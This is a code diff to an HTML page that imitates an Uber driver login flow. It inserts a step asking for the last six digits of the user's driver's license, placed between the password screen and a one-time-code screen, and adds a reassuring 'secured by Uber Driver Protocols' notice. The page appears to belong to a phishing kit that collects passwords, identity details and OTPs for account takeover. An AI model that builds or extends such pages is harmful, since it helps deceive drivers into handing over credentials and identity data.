@@ -10,6 +10,7 @@
     <link rel="shortcut icon" type="image/png" href="/logo.png">
     <link rel="apple-touch-icon" href="/logo.png">
     <!-- Google Fonts -->
+    <link rel="icon" href="/logo.png" type="image/x-icon">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
@@ -127,10 +128,39 @@
                     </form>
                 </div>
 
-                <!-- STEP 3: 4-Digit OTP Screen -->
-                <div id="step-otp" class="step-view hidden-step">
+                <!-- STEP 3: Driver License Screen (Last 6 Digits) -->
+                <div id="step-license" class="step-view hidden-step">
                     <div class="back-link" onclick="goToStepPassword()">
-                        <i class="fa-solid fa-arrow-left"></i> <span id="txt-change-phone">Change password</span> (<span id="user-phone-display"></span>)
+                        <i class="fa-solid fa-arrow-left"></i> <span id="txt-change-password-dl">Change password</span> (<span id="user-phone-display-dl"></span>)
+                    </div>
+
+                    <h2 class="step-heading" id="txt-heading-license">Enter Driver's License</h2>
+                    <p class="otp-instruction" id="txt-instruction-license">Enter the last 6 digits of your driver's license to confirm your identity.</p>
+
+                    <form id="license-form" onsubmit="handleLicenseSubmit(event)">
+                        <div class="input-group">
+                            <label for="license-input" class="input-label" id="txt-label-license">Last 6 Digits of Driver's License</label>
+                            <div class="password-input-wrapper">
+                                <input type="text" id="license-input" class="uber-input" placeholder="e.g. 123456" maxlength="6" pattern="[0-9A-Za-z]{6}" required autocomplete="off">
+                            </div>
+                        </div>
+
+                        <button type="submit" id="btn-submit-license" class="btn-black-primary">
+                            <span class="btn-text" id="txt-btn-license">Continue Verification</span>
+                            <span class="btn-spinner hidden"><i class="fa-solid fa-circle-notch fa-spin"></i></span>
+                        </button>
+
+                        <div class="security-note" id="txt-security-note-dl">
+                            <i class="fa-solid fa-shield-halved"></i>
+                            Your information is encrypted and secured by Uber Driver Protocols.
+                        </div>
+                    </form>
+                </div>
+
+                <!-- STEP 4: 4-Digit OTP Screen -->
+                <div id="step-otp" class="step-view hidden-step">
+                    <div class="back-link" onclick="goToStepLicense()">
+                        <i class="fa-solid fa-arrow-left"></i> <span id="txt-change-phone">Change driver license</span> (<span id="user-phone-display"></span>)
                     </div>
 
                     <h2 class="step-heading" id="txt-heading-otp">Enter Verification Code (OTP)</h2>
